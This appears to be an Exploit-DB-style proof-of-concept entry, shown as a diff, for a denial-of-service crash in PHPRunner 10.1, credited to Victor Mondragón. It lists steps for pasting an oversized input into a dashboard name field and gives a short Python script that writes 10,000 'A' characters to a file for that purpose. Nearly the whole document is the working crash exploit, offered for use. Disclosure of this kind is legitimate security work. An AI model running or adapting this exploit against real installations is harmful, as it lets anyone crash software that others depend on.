@@ -1,0 +1,22 @@
+#Exploit Title:  PHPRunner 10.1 - Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-05-09
+#Vendor Homepage: https://xlinesoft.com/
+#Software Link: https://xlinesoft.com/phprunner/download.htm
+#Tested Version: 10.1
+#Tested on: Windows 7 Service Pack 1 x64 
+
+#Steps to produce the crash:
+#1.- Run python code: PHPRunner_10_1.py
+#2.- Open PHPRunner_10_1.txt and copy content to clipboard
+#3.- Open PHPRunner
+#4.- Click on "Next" > Select "Microsoft Access" database > click on "Next"
+#5.- Click on "Create new database" > click on "Create table"
+#6.- Select "Create dashboard" > in "Name" field Paste Clipboarad
+#7.- Click on "Ok"
+#8.- Crashed
+
+cod = "\x41" * 10000
+f = open('PHPRunner_10_1.txt', 'w')
+f.write(cod)
+f.close()
